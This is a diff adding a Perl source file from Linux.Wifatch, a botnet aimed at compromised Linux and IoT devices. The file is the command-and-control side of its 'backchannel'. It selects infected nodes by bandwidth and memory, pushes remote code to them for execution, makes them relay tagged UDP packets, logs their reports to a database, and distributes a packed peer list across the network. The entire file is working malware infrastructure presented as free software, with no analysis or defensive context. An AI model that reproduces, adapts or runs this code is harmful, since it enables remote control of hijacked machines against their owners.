@@ -1,0 +1,226 @@
+#!/usr/bin/env perl
+#
+# This file is part of Linux.Wifatch
+#
+# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
+#
+# Linux.Wifatch is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Linux.Wifatch is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
+#
+
+# implements the c&c side of bn::backchannel
+# receives messages from nodes and pushes them to the database
+# for other programs to consume, e.g. disinfect2
+
+use strict;
+
+use AnyEvent;
+use Coro;
+use Data::Dump;
+
+use bm::base;
+use bm::sql;
+use bm::cc;
+use bm::pool;
+use bm::nolimits;
+use bm::plpacker;
+use bm::file;
+use bm::meta;
+
+# for some reason, this is needed, otherwise crashes
+Coro::State::cctx_stacksize 32768;
+
+our $poolsize = $ARGV[0] || 20;
+our $minpool = $poolsize - 10;
+our %pool;
+
+my $last_update = EV::now + 15;
+my $next_update = 999999999999;
+my $next_watcher;
+
+####################################################################################
+my $seed_upload = new Coro::Signal;
+my $pool_dirty;
+my $filepool;
+
+async {
+	while () {
+		$seed_upload->wait;
+
+		while ($pool_dirty) {
+			eval {
+				my $cc = new_croak bm::cc bm::sql::getenv "publish";
+
+				print "updating xx4\n";
+
+				$pool_dirty = 0;
+
+				my $xx = new bm::plpacker name => "xx4";
+				$xx->add_seq;
+				$xx->add(nodes => join "", map bm::meta::str2id $_, keys %pool);
+
+				$xx = $xx->as_string;
+				$xx = bm::file::string $xx;
+
+				$cc->c_save($xx, "BASE/.net_4", 0600);
+				$cc->r_eval("bn::xx::load 4; bn::xx::whisper");
+				$cc->res;
+			};
+
+			if ($@) {
+				$pool_dirty = 1;
+				warn $@;
+			}
+		}
+	}
+};
+
+sub update_pool($)
+{
+	my ($when) = @_;
+
+	$pool_dirty = 1;
+
+	$when = 1 if $minpool > keys %pool;
+
+	return if $next_update < $last_update + $when;
+
+	$next_update = $last_update + $when;
+
+	$next_watcher = AE::timer $next_update - EV::now, 0, sub {
+		$last_update = EV::now;
+		$next_update = 1e99;
+		$seed_upload->send;
+	};
+}
+
+####################################################################################
+sub start_backpool
+{
+	$filepool = bm::pool::pool "up > 200000 and down > 200000 and mem > 8000", $poolsize, sub {
+		my $cc = shift;
+
+		warn "$cc->{name} activating\n";
+
+		unless ($minpool > keys %pool) {
+			$cc->r_eval('Coro::AnyEvent::sleep 1200; ()');
+			$cc->res;
+		}
+
+		warn "$cc->{name} active\n";
+
+		$cc->c_eval('
+				my $fh = $fh; # why??
+
+				bn::func::async {
+					my $sem = new Coro::Semaphore;
+
+					my $snd = sub {
+						my $msg = pack "N/a", $_[0], 3600;
+
+						bn::func::async {
+							my $lck = $sem->guard;
+							bn::io::xwrite $fh, $msg;
+						};
+					};
+
+					my $evg = bn::event::on port_packet => sub {
+						"Ekaim3eP" eq substr $_[0], 0, 8
+							or return;
+
+						my ($port, $host) = AnyEvent::Socket::unpack_sockaddr $_[1];
+						$snd->(pack "a4 n a*", $host, $port, substr $_[0], 8);
+					};
+
+					my $evt = EV::timer 60, 60, sub {
+						$snd->("");
+					};
+
+					while (my ($data) = bn::io::xread $fh, 4 + 2 + 8, 86400) {
+						my ($host, $port, $id) = unpack "a4 n a8", $data;
+
+						send $bn::port::UDP, "aeWae1we$id", 0, AnyEvent::Socket::pack_sockaddr $port, $host;
+					}
+				};
+
+				Coro::terminate;
+			');
+
+		$pool{ $cc->{name} } = undef;
+		my $guard = Guard::guard {
+			delete $pool{ $cc->{name} };
+			update_pool 300;
+		};
+		update_pool 7200;
+
+		my $fh = $cc->take_fh;
+
+		bm::sql::perthread;
+
+		my ($host, $port, $id, $data);
+
+		while (my ($data) = bn::io::xreadN $fh, 70000, 90) {
+			length $data    # keepalive
+				or next;
+
+			($host, $port, $id, $data) = unpack "a4 n a8 a*", $data;
+
+			if (my $msg = eval {CBOR::XS::decode_cbor $data }) {
+				my $type = shift @$msg;
+
+				my $ip = AnyEvent::Socket::format_address $host;
+
+				if ($type eq "print") {
+					$msg = $msg->[0];
+					$msg =~ s/([^\x0a\x20-\x7e])/sprintf "\\x%02x", ord $1/ge;
+
+					printf "%15s:%-5s $bm::meta::green%s$bm::meta::normal\n", $ip, $port, $msg;
+				} else {
+					if ($type eq "spec") {
+
+						#							print "SPEC $ip:$port $msg->[0] $msg->[1]\n";
+					} else {
+						ddx [$type, $msg, $ip, $port];
+					}
+
+					sql_exec "insert ignore into back (id, ip, port, type, time, data)
+															values ( ?,  ?,    ?,    ?,    ?,    ?)", $id, (unpack "N", $host), $port, $type, AE::now, CBOR::XS::encode_cbor $msg;
+				}
+			}
+
+			bn::io::xwrite $fh, pack "a4 n a8", $host, $port, $id;
+		}
+
+		print "$cc->{name} deactivated\n";
+	};
+}
+
+sub start_backclean
+{
+	async {
+		bm::sql::perthread;
+
+		while () {
+			sql_exec "delete from back where type = '' and time < ?", EV::now - 86400;
+
+			Coro::AnyEvent::sleep 3600;
+		}
+	};
+}
+
+####################################################################################
+start_backpool;
+start_backclean;
+
+EV::run;
+
